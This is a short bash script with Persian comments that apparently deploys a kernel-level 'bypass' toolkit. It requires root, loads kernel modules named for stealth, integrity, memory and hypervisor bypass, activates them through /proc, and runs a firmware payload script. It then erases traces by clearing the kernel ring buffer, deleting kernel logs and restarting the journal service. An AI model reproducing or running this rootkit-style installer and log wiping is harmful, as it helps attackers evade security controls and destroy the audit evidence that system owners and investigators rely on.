#!/bin/bash
# اسکریپت استقرار خودکار بایپس

if [ "$(id -u)" -ne 0 ]; then
    echo "این اسکریپت نیاز به دسترسی root دارد"
    exit 1
fi

# بارگذاری ماژول‌های بایپس
insmod core/stealth_bypass.ko
insmod core/integrity_bypass.ko
insmod core/memory_bypass.ko
insmod core/hypervisor_bypass.ko

# فعال‌سازی بایپس‌های سطح پایین
echo 1 > /proc/bypass/activate

# استقرار پیلودهای بایپس
./scripts/activate_firmware.sh

# پاک‌سازی ردپاها
dmesg -C
rm -f /var/log/kern.log*
systemctl restart systemd-journald

echo "سیستم بایپس با موفقیت مستقر شد"
